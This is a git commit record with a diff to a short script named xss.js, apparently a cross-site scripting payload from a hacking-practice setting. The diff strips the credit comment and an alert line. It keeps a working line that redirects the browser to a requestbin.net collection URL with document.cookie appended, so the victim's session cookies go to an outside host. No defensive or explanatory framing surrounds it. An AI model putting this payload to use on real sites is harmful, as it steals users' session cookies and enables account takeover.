f4eadc5ddc1f4c11b59c299d73cc751b258aa7c6
Ne0Lux-C1Ph3r <neolux-cipher@hotmail.fr>
2019-10-25 05:03:06 +0200

    Update xss.js

--- scripts/xss.js
+++ scripts/xss.js
@@ -1,9 +1,1 @@
-
-/* This file is based on the file from http://ha.ckers.org/xss.js
-For CanHackMe.............
-*/
-
-document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
-alert(document.location="http://requestbin.net/r/1juu70h1?" + document.cookie);
 document.location="http://requestbin.net/r/1juu70h1?" + document.cookie;
-
